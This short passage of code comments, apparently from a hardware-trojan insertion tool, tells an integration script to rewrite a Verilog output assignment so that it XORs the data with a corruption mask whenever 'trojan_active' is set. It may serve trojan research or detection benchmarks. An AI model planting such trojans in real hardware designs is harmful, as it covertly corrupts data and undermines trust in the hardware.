...
//
// IMPORTANT: data may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If data is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for data (or first output assign):
//     assign data = <expr>;
//   Replace with:
//     assign data = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
